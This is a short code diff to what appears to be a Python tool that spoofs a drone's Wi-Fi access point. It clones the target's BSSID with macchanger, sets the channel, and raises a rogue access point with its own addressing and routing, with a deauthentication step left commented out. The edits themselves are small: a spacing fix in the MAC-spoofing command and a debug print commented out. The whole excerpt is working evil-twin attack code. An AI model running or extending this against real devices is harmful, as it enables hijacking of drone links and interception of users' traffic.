@@ -98,7 +98,6 @@ def rogue_ap():
     #os.system('sudo killall dnsmasq')
     #os.system(f'ifconfig {iface} down')
     #os.system(f'macchanger --mac={bssid_name} {iface}')
-
     #os.system(f'ifconfig {iface} up')
     os.system(f'ifconfig {iface} up 192.168.1.1 netmask 255.255.255.0')
     os.system('route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1')
@@ -144,7 +143,7 @@ def main():
     #used to spoof drone access point
     os.system(f"ifconfig {iface} down")
     os.system(f"iwconfig {iface} channel {channel_no}")
-    os.system(f"macchanger --mac={bssid_name}{iface}")
+    os.system(f"macchanger --mac={bssid_name} {iface}")
     os.system(f"ifconfig {iface} up")
 
     create_configs(iface, essid_name, channel_no)
@@ -152,7 +151,7 @@ def main():
     #da = Process(target = deauth, args = (0, bssid_name, iface))
     #da.start()
     rogue_ap()
-    print('RAM memory % used:', psutil.virtual_memory()[2])
+    #print('RAM memory % used:', psutil.virtual_memory()[2])
     print("congrats")
     #da.terminate()
 
